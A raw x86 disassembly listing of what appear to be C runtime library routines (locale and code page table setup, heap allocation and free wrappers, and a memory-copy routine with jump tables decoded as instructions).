  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
